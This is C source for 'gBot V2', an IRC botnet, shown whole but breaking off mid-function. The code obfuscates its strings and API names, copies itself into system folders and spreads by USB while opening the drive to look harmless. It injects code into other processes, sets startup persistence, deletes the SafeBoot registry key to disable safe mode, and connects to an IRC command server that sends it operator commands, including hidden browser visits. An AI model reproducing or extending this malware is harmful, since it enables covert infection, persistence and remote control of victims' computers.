/*
	Proj: gBot V2
	By  : Jam3s, Fubar, and Proxy God
*/

#include "StdAfx.h"


Injdat sInj;
Injplugin sPlugin;

int XKEY[32] = {52, 53, 55, 102, 55, 57, 48, 54, 48, 101, 56, 50, 54, 52, 98, 50, 98, 53, 101, 50, 56, 57, 54, 56, 53, 57, 49, 97, 52, 97, 48, 51,};
char szEncryptionKey[33];

int deckey(char Key[33])
{
	memset(Key, 0, sizeof(Key));
	
	for (int y = 0; y < sizeof(XKEY); y++)
	{
		sprintf(Key, "%s%c", Key, XKEY[y]);
	}
	
	Key[32] = 0;
	return 1;
}

/* Library Functions */

_inline void *bmemset(void *p, int c, size_t n)
{
	char *pb = (char *) p;
	char *pbend = pb + n;
	while (pb != pbend) *pb++ = c;
	return p;

}

_inline void bsrand(long *holdrand, unsigned int seed)
{
	*holdrand = (long) seed;
}

_inline int brand(long *holdrand)
{
	return (((*holdrand = *holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

_inline int bstrncmp(const char *s1, const char *s2, size_t count)
{
	if (!count) return 0;
	
	while (--count && *s1 && *s1 == *s2)
	{
		s1++;
		s2++;
	}
	
	return *(unsigned char *) s1 - *(unsigned char *) s2;
}

_inline char *strstr(const char *str1, const char *str2)
{
  char *cp = (char *) str1;
  char *s1, *s2;

  if (!*str2) return (char *) str1;

  while (*cp)
  {
    s1 = cp;
    s2 = (char *) str2;

    while (*s1 && *s2 && !(*s1 - *s2)) s1++, s2++;
    if (!*s2) return cp;
    cp++;
  }

  return NULL;
}

_inline char *strncpy(char *dst, const char *src, size_t n)
{
	if (n != 0) {
		char *d = dst;
		const char *s = src;
		
		do {
			if ((*d++ = *s++) == 0) {
				/* NUL pad the remaining n-1 bytes */
				while (--n != 0)
					*d++ = 0;
				break;
			}
		} while (--n != 0);
	}
	return (dst);
}

_inline void *mmalloc(size_t Size)
{
	return HeapAlloc (GetProcessHeap(), 0, Size);
}

_inline char* bitoa(int n)
{
	int i=0,j;
	char s[32];
	char u[32];

	for(int x=0; x< sizeof(s); x++) { s[x] = 0; };
	for(x=0; x< sizeof(u); x++) { u[x] = 0; };

	do{
		s[i++]=(char)( n%10+48 );
		n-=n%10;
	}while((n/=10)>0);
	for (j=0;j<i;j++)
		u[i-1-j]=s[j];

	u[j]='\0';

	return u;
}

_inline int batoi(char *str)
{
	int num = 0;
	int i = 0;

	while ((str[i] != NULL) && (str[i] != '\0')) {
		if ((48 <= str[i]) && (str[i] <= 57)) {
			num = ((num *= 10) + (str[i] - 48));
			i++;
		} else {
			return -1;
		}
	}
	return num;
}
/* Entry Code */
size_t wcslen(const wchar_t * s)
{
	const wchar_t *save;
	
	if (s == 0)
		return 0;
	for (save = s; *save; ++save);
	return save-s;
}

char *sexor(char *string, char *decode_key)
{
	unsigned int	i, j;
	char *orig = (char *)malloc(strlen(string)+1);
	
	memset(orig, 0, sizeof(orig));
	sprintf(orig, string);
	
	for ( i = 0; i < strlen( orig ); i++ ) {
		for ( j = 0; j < strlen( decode_key ); j++ )
			orig[ i ] ^= decode_key[ j ];
		
		orig[ i ] =~ orig[ i ];
		
	}
	return orig;	
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)	
{
	LPWSTR *argv;
	int argc;
	char szPath[MAX_PATH] = { 0 };
	char szInject[MAX_PATH] = { 0 };
	char szInjectOrig[MAX_PATH] = { 0 };
	char szInstallPath[MAX_PATH] = { 0 }; 
	char szParams[512] = { 0 };
	HINSTANCE hRes, hShell32, hKernel32, hRez;
	char szParamRemove[8] = { 0 };
	char szParamInject[8] = { 0 };
	char szParamUSB[8] = { 0 };
	char szParamPlugin[8] = { 0 };
	char szDrive[3] = { 0 };
	BOOL bUSB = FALSE;


	// Anti KAV HEUR?
// 	int z = GetTickCount( );
// 	Sleep( 500 );
// 	int c = GetTickCount( );
// 	if ( ( c - z ) != 500 ) {
// 		ExitProcess(0);
// 	}

#ifdef _HASANTIS
	if (UseAnti() == true)
		ExitProcess(0);
#endif	// so wait, how do i enable/disable its already enabled but

	// Decrypt integered encryption key...
	deckey(szEncryptionKey);

	sprintf(szParamInject, "%s", sexor(PARAM_INJECT, szEncryptionKey));
	sprintf(szParamRemove, "%s", sexor(PARAM_REMOVE, szEncryptionKey));
	sprintf(szParamUSB, "%s", sexor(PARAM_USB, szEncryptionKey));
	sprintf(szParamPlugin, "%s", sexor(PARAM_PLUGIN, szEncryptionKey));

	GetModuleFileName(GetModuleHandle(NULL), szPath, sizeof(szPath));
	if (szPath == NULL) { return 0; };

	szDrive[0] = szPath[0];
	szDrive[1] = szPath[1];
	szDrive[3] = 0;

	memset(szParams, 0, sizeof(szParams));
	memset(szInject, 0, sizeof(szInject));
	memset(szInstallPath, 0, sizeof(szInstallPath));

	hShell32 = LoadLibrary(sexor(DLL_SHELL32, szEncryptionKey));
		sInj.API.ShellExecute =				(SE32)GetProcAddress(hShell32, sexor(API_SHELLEXECUTE, szEncryptionKey));
		sInj.API.SHGetFolderPath =			(SHGF)GetProcAddress(hShell32, sexor(API_SHGETFOLDERPATH, szEncryptionKey));
	FreeLibrary(hShell32);
	hKernel32 = LoadLibrary(sexor(DLL_KERNEL32, szEncryptionKey));
		sInj.API.GetDriveType =				(GDT)GetProcAddress(hKernel32, sexor(API_GETDRIVETYPE, szEncryptionKey));
		sInj.API.CopyFile =					(CPYF)GetProcAddress(hKernel32, sexor(API_COPYFILE, szEncryptionKey));
		sInj.API.WideCharToMultiByte =		(WCTMB)GetProcAddress(hKernel32, sexor(API_WIDECHARTOMULTIBYTE, szEncryptionKey));
		sInj.API.GetFileSize =				(GFS)GetProcAddress(hKernel32, sexor(API_GETFILESIZE, szEncryptionKey));
		sInj.API.CreateFile =				(CF)GetProcAddress(hKernel32, sexor(API_CREATEFILE, szEncryptionKey));
		sInj.API.CloseHandle =				(CH)GetProcAddress(hKernel32, sexor(API_CLOSEHANDLE, szEncryptionKey));
		sInj.API.FindFirstFile =			(FFF)GetProcAddress(hKernel32, sexor(API_FINDFIRSTFILE, szEncryptionKey));
		sInj.API.FindNextFile =				(FNF)GetProcAddress(hKernel32, sexor(API_FINDNEXTFILE, szEncryptionKey));
		sInj.API.FindClose =				(FC)GetProcAddress(hKernel32, sexor(API_FINDCLOSE, szEncryptionKey));
	FreeLibrary(hKernel32);

	if (sInj.API.GetDriveType(szDrive) == DRIVE_REMOVABLE)
	{
		bUSB = TRUE;
		// Lets display the explorer for the usb so it doesnt seem suspicious!
		char path[5] = { 0 };
		strncpy(path, szPath, 3);
		path[3] = 0;
		sInj.API.ShellExecute(NULL, "OPEN", path, NULL, NULL, SW_SHOW); // open drive in explorer to keep hidden!
	}


	sInj.API.SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, sInj.Vars.Folders.szAppData);
	sInj.API.SHGetFolderPath(NULL, CSIDL_WINDOWS, NULL, 0, sInj.Vars.Folders.szWindowsDir);
	sInj.API.SHGetFolderPath(NULL, CSIDL_SYSTEM, NULL, 0, sInj.Vars.Folders.szSystemDir);

	// Ok we want to check the path to see if we are the installed version (into startup)..
	if (!strstr(szPath, sexor(BOT_INSTALLAS, szEncryptionKey)))
	{
		// Ok were not the final installed version - lets install ourselves...
		sprintf(szInstallPath, "%s\\%s", sInj.Vars.Folders.szSystemDir, sexor(BOT_INSTALLAS, szEncryptionKey));
		if (sInj.API.CopyFile(szPath, szInstallPath, FALSE))
		{
			// Ok we've copied to System32
			if (bUSB == FALSE) {
				sprintf(szParams, "%s \"%s\"", sexor(PARAM_REMOVE, szEncryptionKey), szPath);
			} else {
				sprintf(szParams, "%s", sexor(PARAM_USB, szEncryptionKey));
			}
			hRes = sInj.API.ShellExecute(NULL, sexor(GEN_OPEN, szEncryptionKey), szInstallPath, szParams, NULL, SW_HIDE);
			if ((int)hRes > 32) {
				ExitProcess(0);
			}
		}
		// Ok were not the final installed version - lets install ourselves...
		sprintf(szInstallPath, "%s\\%s", sInj.Vars.Folders.szWindowsDir, sexor(BOT_INSTALLAS, szEncryptionKey));
		if (sInj.API.CopyFile(szPath, szInstallPath, FALSE))
		{
			// Ok we've copied to WinDir
			if (bUSB == FALSE) {
				sprintf(szParams, "%s \"%s\"", sexor(PARAM_REMOVE, szEncryptionKey), szPath);
			} else {
				sprintf(szParams, "%s", sexor(PARAM_USB, szEncryptionKey));
			}
			hRes = sInj.API.ShellExecute(NULL, sexor(GEN_OPEN, szEncryptionKey), szInstallPath, szParams, NULL, SW_HIDE);
			if ((int)hRes > 32) {
				ExitProcess(0);
			}
		}
		// Ok were not the final installed version - lets install ourselves...
		sprintf(szInstallPath, "%s\\%s", sInj.Vars.Folders.szAppData, sexor(BOT_INSTALLAS, szEncryptionKey));
		if (sInj.API.CopyFile(szPath, szInstallPath, FALSE))
		{
			// Ok we've copied to AppData
			if (bUSB == FALSE) {
				sprintf(szParams, "%s \"%s\"", sexor(PARAM_REMOVE, szEncryptionKey), szPath);
			} else {
				sprintf(szParams, "%s", sexor(PARAM_USB, szEncryptionKey));
			}
			hRes = sInj.API.ShellExecute(NULL, sexor(GEN_OPEN, szEncryptionKey), szInstallPath, szParams, NULL, SW_HIDE);
			if ((int)hRes > 32) {
				ExitProcess(0);
			}
		}
	}

	// Continue otherwise :|

	argv = CommandLineToArgvW(GetCommandLineW(), &argc);

	if (argc > 1 && argc <= 4)
	{
		char AnsiPath[MAX_PATH], AnsiCmd[MAX_PATH], AnsiPath2[MAX_PATH], AnsiPath3[MAX_PATH];

		if (argv[0] != NULL) {
			bmemset(AnsiPath, 0, sizeof(AnsiPath));
			sInj.API.WideCharToMultiByte(CP_ACP, 0, argv[0], wcslen(argv[0])+1, AnsiPath , sizeof(AnsiPath), NULL, NULL);
		}
		if (argv[1] != NULL) {
			bmemset(AnsiCmd, 0, sizeof(AnsiCmd));
			sInj.API.WideCharToMultiByte(CP_ACP, 0, argv[1], wcslen(argv[1])+1, AnsiCmd , sizeof(AnsiCmd), NULL, NULL);
		}
		if (argv[2] != NULL) {
			bmemset(AnsiPath2, 0, sizeof(AnsiPath2));
			sInj.API.WideCharToMultiByte(CP_ACP, 0, argv[2], wcslen(argv[2])+1, AnsiPath2 , sizeof(AnsiPath2), NULL, NULL);
		}
		if (!strcmp(AnsiCmd, szParamPlugin)) {
			if (argv[3] != NULL) {
				bmemset(AnsiPath3, 0, sizeof(AnsiPath3));
				sInj.API.WideCharToMultiByte(CP_ACP, 0, argv[3], wcslen(argv[3])+1, AnsiPath3 , sizeof(AnsiPath3), NULL, NULL);
			}
		}


		// Got arguments
// 		OutputDebugString(AnsiPath);
// 		OutputDebugString(AnsiCmd);
// 		OutputDebugString(AnsiPath2);
// 		OutputDebugString(AnsiPath3);

		if ((!strcmp(AnsiCmd, szParamPlugin)) && AnsiPath2 != NULL && AnsiPath3 != NULL)
		{
			// Told to start plugin - lets start it then ExitProcess...
			if (is_64())
			{
				// Its 64 bit
				
				hRez = sInj.API.ShellExecute(NULL, sexor(GEN_OPEN, szEncryptionKey), sexor(GEN_BROWSER, szEncryptionKey), NULL, NULL, SW_HIDE);
				strcpy(szInject, sexor(GEN_BROWSER, szEncryptionKey));
				Start_Plugin(szInject, AnsiPath3);
			} else {
				Start_Plugin(AnsiPath2, AnsiPath3);
			}
			ExitProcess(0);
		}

		if ((!strcmp(AnsiCmd, szParamInject)) && AnsiPath2 != NULL) 
		{
			// Told to move
			strcpy(szInject, AnsiPath2);
		} else {
			strcpy(szInject, sexor(INJECT_INTO, szEncryptionKey));
		}
		if ((!strcmp(AnsiCmd, szParamRemove)) && AnsiPath2 != NULL) 
		{
			// Told to remove
// 			OutputDebugString("Trying to remove");
// 			OutputDebugString(AnsiPath2);
			while(DeleteFile(AnsiPath2) == 0)
			{
				Sleep(5000);
			}
		}
		if (!strcmp(AnsiCmd, szParamUSB))
		{
			// Told its USB infect
			strcpy(sInj.Vars.Others.szIsUSBInfect, sexor(GEN_ON, szEncryptionKey));
		} else {
			strcpy(sInj.Vars.Others.szIsUSBInfect, sexor(GEN_OFF, szEncryptionKey));
		}
	} else {
		strcpy(szInject, sexor(INJECT_INTO, szEncryptionKey));
	}

// 	OutputDebugString(sexor(INJECT_INTO, szEncryptionKey));
// 	OutputDebugString(sexor(BOT_DNS1, szEncryptionKey));
// 	OutputDebugString(sexor(BOT_DNS2, szEncryptionKey));

	// Grab User agent (NO POINTER OR CRIPPLES UPDATE FOR UNKNOWN REASON!)
	DWORD dwSize = sizeof(sInj.Vars.Others.szUserAgent);
	ObtainUserAgentString(0, sInj.Vars.Others.szUserAgent, &dwSize);
	sInj.Vars.Others.szUserAgent[dwSize] = 0;
	if (sInj.Vars.Others.szUserAgent == NULL) { strcpy(sInj.Vars.Others.szUserAgent, "Mozilla/5.0"); };

	// Lets grab browser path

	HINSTANCE hAdvapi;
	char szBuffer[1080] = { 0 };
	unsigned long lSize = sizeof(szBuffer) + 1;
	HKEY hKey;	

	hAdvapi = LoadLibrary(sexor(DLL_ADVAPI32, szEncryptionKey));
		sInj.API.RegCloseKey = (RCK)GetProcAddress(hAdvapi, sexor(API_REGCLOSEKEY, szEncryptionKey));
		sInj.API.RegCreateKeyEx = (RCKE)GetProcAddress(hAdvapi, sexor(API_REGCREATEKEYEX, szEncryptionKey));
		sInj.API.RegOpenKeyEx = (ROKE)GetProcAddress(hAdvapi, sexor(API_REGOPENKEYEX, szEncryptionKey));
		sInj.API.RegQueryValueEx = (RQVE)GetProcAddress(hAdvapi, sexor(API_REGQUERYVALUEEX, szEncryptionKey));
		sInj.API.RegSetValueEx = (RSVE)GetProcAddress(hAdvapi, sexor(API_REGSETVALUEEX, szEncryptionKey));
		sInj.API.RegDeleteKey = (RDK)GetProcAddress(hAdvapi, sexor(API_REGDELETEKEY, szEncryptionKey));
		sInj.API.RegEnumKeyEx = (REKE)GetProcAddress(hAdvapi, sexor(API_REGENUMKEYEX, szEncryptionKey));
	FreeLibrary(hAdvapi);
	
	if(sInj.API.RegOpenKeyEx(HKEY_CLASSES_ROOT, sexor(FOLDER_DEFBROWSE, szEncryptionKey), 0, KEY_ALL_ACCESS, &hKey ) == 0) {
		if(sInj.API.RegQueryValueEx( hKey, NULL, NULL, NULL, (unsigned char*)szBuffer, &lSize ) == 0 ) {
			sInj.API.RegCloseKey(hKey); 			
		}
		sInj.API.RegCloseKey( hKey );
	}
	for (int x = 0; szBuffer[x] != NULL; x++)
	{
		if (szBuffer == NULL) { break; };
		if ((szBuffer[x] == 69 || szBuffer[x] == 101) && (szBuffer[x+1] == 88 || szBuffer[x+1] == 120) && (szBuffer[x+2] == 69 || szBuffer[x+2] == 101)) {
			// its EXE/ExE/eXe/exe....
			strcat(sInj.Vars.Folders.szBrowserKey, "EXE\"");
			sInj.Vars.Folders.szBrowserKey[strlen(sInj.Vars.Folders.szBrowserKey)] = 0;
			break;
		} else {
			sInj.Vars.Folders.szBrowserKey[x] = szBuffer[x];
		}
	}

	HANDLE hFile;

	hFile = sInj.API.CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,	0, NULL);

	if (hFile != INVALID_HANDLE_VALUE) {
		 sInj.Vars.FileProtection.dwFileSize = sInj.API.GetFileSize(hFile, NULL);
	} else {
		sInj.Vars.FileProtection.dwFileSize = 0;
	}
	sInj.API.CloseHandle(hFile);

	// We need some simple logic here - If user is Admin use the highest available process (services/lsass/winlogon) 
	// If its user we should use explorer as the rest will be protected (most likely)
	strcpy(sInj.Vars.Settings.szBotPath, szPath);
	// Check if system is 64bit

	BOOL b64Bit;

	b64Bit = is_64();

	if (b64Bit)
	{
		// Its 64 bit
		strcpy(sInj.Vars.Others.szArchitecture, "64");
		hRez = sInj.API.ShellExecute(NULL, sexor(GEN_OPEN, szEncryptionKey), sexor(GEN_BROWSER, szEncryptionKey), NULL, NULL, SW_HIDE);
		strcpy(szInject, sexor(GEN_BROWSER, szEncryptionKey));
	} else {
		strcpy(sInj.Vars.Others.szArchitecture, "32");
	}


	if (Start_gBot(szInject, szPath) == FALSE)
	{
		if (Start_gBot(sexor(INJECT_INTO, szEncryptionKey), szPath) == FALSE)
		{
			Start_gBot(sexor(INJECT_BACKUP, szEncryptionKey), szPath);
		}
	}

	if (b64Bit) {
		do_startup(sInj, szPath, sexor(BOT_RUNREGKEY, szEncryptionKey), 64);
	} else {
		do_startup(sInj, szPath, sexor(BOT_RUNREGKEY, szEncryptionKey), 32);
	}


	// Lets try cripple safemode...
	BOOL bRes;
	bRes = RegDelnode(HKEY_LOCAL_MACHINE, sexor(FOLDER_SAFEMODE, szEncryptionKey));

	
	// Lets scan appdata for plugins and remove them.
	WIN32_FIND_DATA w32fd;
	HANDLE hFind;
	char szTemp[MAX_PATH] = { 0 };
	char szBuff[MAX_PATH] = { 0 };
	
	sprintf(szTemp, "%s\\*%s", sInj.Vars.Folders.szAppData, sexor(GEN_PLUG, szEncryptionKey));
	hFind = sInj.API.FindFirstFile(szTemp, &w32fd);
	
	if (hFind != INVALID_HANDLE_VALUE) 
	{
		sprintf(szBuff, "%s\\%s", sInj.Vars.Folders.szAppData, w32fd.cFileName);
		DeleteFile(szBuff);
		while(sInj.API.FindNextFile(hFind, &w32fd))
		{
			sprintf(szBuff, "%s\\%s", sInj.Vars.Folders.szAppData, w32fd.cFileName);
			DeleteFile(szBuff);
		}
		if (GetLastError() == ERROR_NO_MORE_FILES) {
		}
	}
	sInj.API.FindClose(hFind);
	return 0;
}

_inline char *bstrchr(const char *s, int ch)
{
	while (*s && *s != (char) ch) s++;
	if (*s == (char) ch) return (char *) s;
	return NULL;
}

/* Inject Code */
PDWORD inject(HANDLE hProcess, LPVOID ThreadStart, DWORD cboSize)
{
	PDWORD pdwCodeRemote = NULL;
	PDWORD pdwCodeRemote2 = NULL;
	DWORD dwOldProtect, dwNumBytesXferred = 0;
	
	pdwCodeRemote = (PDWORD) sInj.API.VirtualAllocEx(hProcess, 0, cboSize, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
	
	if (pdwCodeRemote == 0)
		return 0;
	if (!sInj.API.VirtualProtectEx(hProcess, pdwCodeRemote, cboSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)) 
		return 0;
	if (sInj.API.WriteProcessMemory( hProcess, pdwCodeRemote, ThreadStart, cboSize, &dwNumBytesXferred) == 0)
		return 0;
	
	return pdwCodeRemote;
}


/* Remote Functions */
// If you are to add dci code to a .cpp file
// You wish to #include "file.cpp" here above IRC_Connect

_inline int IRC_Connect(LPVOID injStr, char *host, unsigned short port)
{
	Injdat *pInj =  (Injdat *)injStr;
	unsigned int		resv_host;
	struct sockaddr_in	address;
	SOCKET				sock;
	
	resv_host = Resolve(injStr, host);
	if (resv_host == 0)
		return -1;
	
	address.sin_addr.s_addr = resv_host;
	address.sin_family = AF_INET;
	address.sin_port = pInj->API.htons(port);
	
	if ((sock = pInj->API.socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)	
		return -2;
	
	if (pInj->API.connect(sock, (struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
		return -3;
	
	else
		return sock;

}

_inline void Add_CRLF(Injdat *pInj, char *szData)
{
	szData[pInj->API.lstrlen(szData)] = '\0';
	szData[pInj->API.lstrlen(szData)] = 13;
	szData[pInj->API.lstrlen(szData)+1] = 10;
	return;
}

_inline void Clear_Var(Injdat *pInj, char *szData)
{
	long l;

	for (l = 0; l < pInj->API.lstrlen(szData); l++)
			szData[l] = 0;

	return;
}

_inline int IRC_Login(LPVOID injStr, SOCKET sock)
{
	Injdat  *pInj =  (Injdat *)injStr;
	char	szNick[256] = { 0 };
	char	buff[1024] = { 0 };
	
	GenerateNick(pInj, szNick);
	// Send NICK
	Clear_Var(pInj, buff);
	pInj->API.lstrcpy(buff, pInj->Vars.Others.szPASS);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Settings.szDNS_Pass);
	Add_CRLF(pInj, buff);
	pInj->API.send(sock, buff, pInj->API.lstrlen(buff), 0);
	pInj->API.lstrcpy(buff, pInj->Vars.Others.szNICK);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, szNick);
	Add_CRLF(pInj, buff);
	pInj->API.send(sock, buff, pInj->API.lstrlen(buff), 0);
	//pInj->API.OutputDebugString(buff);

	// Send USER
	Clear_Var(pInj, buff);
	pInj->API.lstrcpy(buff, pInj->Vars.Others.szUSER);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, szNick);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szUSERMiddle);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szUSERMiddle);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
	pInj->API.lstrcat(buff, pInj->Vars.Others.szColon);
	pInj->API.lstrcat(buff, szNick);
	Add_CRLF(pInj, buff);
	pInj->API.send(sock, buff, pInj->API.lstrlen(buff), 0);
	//pInj->API.OutputDebugString(buff);

	return 1;
}
_inline int IRC_Listen(LPVOID injStr, SOCKET sock)
{
	Injdat		*pInj =  (Injdat *)injStr;
	int			len, l;
	char		buffer[1024];
	
	while (sock > 0)
	{
		len = 0;
		for (l = 0; l < sizeof(buffer); l++)
			buffer[l] = 0;
		
		while ((sock) > 0)
		{
			if (len == sizeof(buffer) - 1)
				break;
			l = pInj->API.recv(sock, buffer + len, 1, 0);
			if (l <= 0)
				return 0;
			len += l;
			if (buffer[len-1] == 13 || buffer[len-1] == 10)
				break;
		}
		
		if (sock <= 0)
			return 0;
		
		else if (len < 2)
			continue;
		
		else
		{
			buffer[len-1] = 0;
 			if ((l = IRC_Parse(injStr, sock, buffer)) < 0)
 				return l;
		}
	}
	
	return sock;
}
_inline int IRC_CheckHost(LPVOID injStr, char *master)
{
	Injdat		*pInj =  (Injdat *)injStr;
	char	*host;
	
	host = bstrchr(master, 64);
	
	if (host == NULL)
		return 0;
	
	if (!pInj->API.lstrcmp(host + 1, pInj->Vars.Settings.szMasterHost))
		return 1;
	else
		return 0;
}
_inline char *IRC_IsOrder(LPVOID injStr, char *order)
{
	Injdat		*pInj =  (Injdat *)injStr;
	
	if (!bstrncmp(order, pInj->Vars.Settings.szPrefix, pInj->API.lstrlen(pInj->Vars.Settings.szPrefix)))
	{
		order += pInj->API.lstrlen(pInj->Vars.Settings.szPrefix);
		return order;
	}
	else
		return NULL;
}
_inline int IRC_ParseSingleCommand(LPVOID injStr, SOCKET sock, char **word, int p, char *from)
{
	Injdat		*pInj =  (Injdat *)injStr;
	char		buff[1024];
	char		szCurrentPath[MAX_PATH] = { 0 };
	int			order;
	PROCESS_INFORMATION	pInfo;
	STARTUPINFO	sInfo;
	char params[512] = { 0 };
	BOOL bRes;
	int count;
	int y = 0;
	int x = 0;

	count = 0;
	order = 0;

	bmemset(buff, 0, sizeof(buff));

	// Commands with no parameters
	if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szSort))							// Sort
	{
		pInj->API.lstrcpy(params, pInj->Vars.Others.szCountry);
		params[3] = 0;
		pInj->API.lstrcpy(buff, pInj->Vars.Others.szJOIN);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szChanPrefix);
		pInj->API.lstrcat(buff, params);
		Add_CRLF(pInj, buff);
		pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		return 1;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szUSort))					// Unsort
	{
		pInj->API.lstrcpy(params, pInj->Vars.Others.szCountry);
		params[3] = 0;
		pInj->API.lstrcpy(buff, pInj->Vars.Others.szPART);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szChanPrefix);
		pInj->API.lstrcat(buff, params);
		Add_CRLF(pInj, buff);
		pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		return 1;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szPath))						// Bot Path
	{
		pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_BotLocated);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Settings.szBotPath);
		Send_PRIVMSG(pInj, from, buff);
		return 1;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szRemove))					// Remove
	{
		pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_Removing);
		Send_PRIVMSG(pInj, from, buff);
		return -10;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szVersion))					// Version
	{
		Clear_Var(pInj, buff);
		pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_Version);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szBotVersion);
		Send_PRIVMSG(pInj, from, buff);
		return 1;
	} else if(!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szInfo))						// Info
	{
		//bmemset(szCurrentPath, 0, sizeof(szCurrentPath));
		Clear_Var(pInj, szCurrentPath);
		pInj->API.GetModuleFileName(pInj->API.GetModuleHandle(NULL), szCurrentPath, sizeof(szCurrentPath));
		pInj->API.lstrcpy(buff, pInj->Vars.Messages.szMsg_InjectedInto);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, szCurrentPath);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_UsingOS);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szFullOperatingSystem);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_UsingVER);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szBotVersion);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Messages.szMsg_UsingArch);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szArchitecture);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
		pInj->API.lstrcat(buff, pInj->Vars.Others.szArchType);
		Send_PRIVMSG(pInj, from, buff);
		return 1;
	} else if(!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szSpeedTest))					// Speedtest
	{
		// MAYBE REPLACE BELOW BMEMSET IF CRASHES - BMEMSET SEEMS TO CRASH SHIT
		bmemset(pInj->Vars.Speedtest.szFrom, 0, sizeof(pInj->Vars.Speedtest.szFrom));
		pInj->API.lstrcpy(pInj->Vars.Speedtest.szFrom, from);
		if (word[p + 1] != NULL) {
			// User specified a length
			if (batoi(word[p + 1]) > 0)
			{
				// Bigger than ten
				pInj->Vars.Speedtest.iMin = batoi(word[p + 1]);
			} else {
				pInj->Vars.Speedtest.iMin = 0;
			}
		} else {
			pInj->Vars.Speedtest.iMin = 0;
		}
		pInj->Vars.Speedtest.hThread = pInj->API.CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pInj->Threads.Speedtest, (LPVOID)pInj, 0, 0);
		return 1;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szExit))			// Exit/Die
	{
		Send_QUIT(pInj, from, pInj->Vars.Messages.szMsg_Quitting);
		return -4;
	} else if (!pInj->API.lstrcmp(word[p],pInj->Vars.Commands.szReconnect))		// Reconnect
	{
		Send_QUIT(pInj, from, pInj->Vars.Messages.szMsg_Reconnecting);
		return -6;
	} else if (word[p + 1] == NULL) {											// Commands with 1 parameter below this
		return 0;
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szJoin))			// Join
	{
		if (word[p + 1] != NULL) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szJOIN);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, word[p + 1]);
			Add_CRLF(pInj, buff);
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szPart))			// Part
	{
		if (word[p + 1] != NULL) {
			pInj->API.lstrcpy(buff, pInj->Vars.Others.szPART);
			pInj->API.lstrcat(buff, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(buff, word[p + 1]);
			Add_CRLF(pInj, buff);
			pInj->API.send(pInj->Vars.IRC.sckIRC, buff, pInj->API.lstrlen(buff), 0);
		}
	} else if (!pInj->API.lstrcmp(word[p], pInj->Vars.Commands.szVisit))		// Visit
	{
		if (word[p + 1] != NULL) {
			// We have a URL

			if (!pInj->API.lstrcmp(word[p + 2], pInj->Vars.Others.szMute)) {
				pInj->API.keybd_event(173, NULL, NULL, NULL);
			} else if (!pInj->API.lstrcmp(word[p + 3], pInj->Vars.Others.szMute)) {
				pInj->API.keybd_event(173, NULL, NULL, NULL);
			}
			

			pInj->API.lstrcpy(params, pInj->Vars.Folders.szBrowserKey);
			pInj->API.lstrcat(params, pInj->Vars.Others.szSpace);
			pInj->API.lstrcat(params, pInj->Vars.Others.szQuote);
			pInj->API.lstrcat(params, word[p + 1]);
